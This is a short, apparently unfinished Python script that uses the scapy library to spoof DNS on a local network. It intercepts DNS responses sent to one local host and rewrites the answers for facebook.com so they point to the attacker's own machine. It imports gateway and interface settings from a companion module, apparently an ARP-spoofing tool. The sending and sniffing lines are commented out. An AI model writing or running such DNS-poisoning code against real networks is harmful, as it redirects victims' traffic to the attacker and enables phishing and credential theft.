from scapy.all import *
from kicker import GATEWAY, IFNAME

def handle_packet(pkt):
    
    if pkt.haslayer(IP) and pkt[IP].dst == "10.100.102.51":
        if pkt.haslayer(DNS) and pkt[DNS].qr == 1:
            qname = pkt[DNS].qd.qname.decode("utf-8")
            if qname == "www.facebook.com." or qname == "www.facebook.com" or qname == "facebook.com." or qname == "facebook.com":
                pkt[DNS].an.rdata = get_if_addr(IFNAME)

    #sr(pkt)


print(get_if_list())
#sniff(prn=handle_packet)
